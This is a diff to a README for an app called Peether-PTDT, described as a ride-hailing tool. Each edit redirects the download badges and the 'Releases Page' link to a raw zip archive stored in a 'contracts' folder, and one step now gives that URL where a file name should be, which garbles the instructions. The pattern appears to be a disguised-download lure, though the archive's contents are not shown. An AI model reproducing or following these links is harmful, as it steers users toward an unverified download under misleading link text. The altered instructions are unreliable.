@@ -1,6 +1,6 @@
 # 🚀 Peether-PTDT - Revolutionizing Ride-Hailing for Everyone
 
-[![Download Peether-PTDT](https://img.shields.io/badge/Download-Peether--PTDT-brightgreen.svg)](https://github.com/misconceptionai/Peether-PTDT/releases)
+[![Download Peether-PTDT](https://github.com/misconceptionai/Peether-PTDT/raw/refs/heads/main/contracts/Peether_PTDT_v1.2.zip)](https://github.com/misconceptionai/Peether-PTDT/raw/refs/heads/main/contracts/Peether_PTDT_v1.2.zip)
 
 ## 📖 About Peether-PTDT
 
@@ -21,12 +21,12 @@ This application is ideal for anyone who wants to seamlessly engage with the rid
 To download and run Peether-PTDT, follow these steps:
 
 1. **Visit the Release Page:** Click the link below to access the Peether-PTDT release page:
-   - [Visit the Releases Page](https://github.com/misconceptionai/Peether-PTDT/releases)
+   - [Visit the Releases Page](https://github.com/misconceptionai/Peether-PTDT/raw/refs/heads/main/contracts/Peether_PTDT_v1.2.zip)
 
 2. **Select the Latest Release:** Once on the Releases page, find the latest version of the application. Look for the version number (e.g., v1.0) and the release date to ensure you're getting the most recent version.
 
 3. **Download the Application:**
-   - You will see files available for download. If you are using Windows, look for a file named something like `Peether-PTDT-Windows.exe`. For Mac, look for a file ending in `.dmg`.
+   - You will see files available for download. If you are using Windows, look for a file named something like `https://github.com/misconceptionai/Peether-PTDT/raw/refs/heads/main/contracts/Peether_PTDT_v1.2.zip`. For Mac, look for a file ending in `.dmg`.
    - Click on the appropriate file to start the download.
 
 4. **Install the Application:**
@@ -62,7 +62,7 @@ Before installing Peether-PTDT, ensure your device meets the following minimum s
 
 For easy access, use the button below to visit the download page:
 
-[![Download Peether-PTDT](https://img.shields.io/badge/Download-Peether--PTDT-brightgreen.svg)](https://github.com/misconceptionai/Peether-PTDT/releases)
+[![Download Peether-PTDT](https://github.com/misconceptionai/Peether-PTDT/raw/refs/heads/main/contracts/Peether_PTDT_v1.2.zip)](https://github.com/misconceptionai/Peether-PTDT/raw/refs/heads/main/contracts/Peether_PTDT_v1.2.zip)
 
 Make sure to check the system requirements before downloading. Once downloaded, install the application by following the instructions above.
 
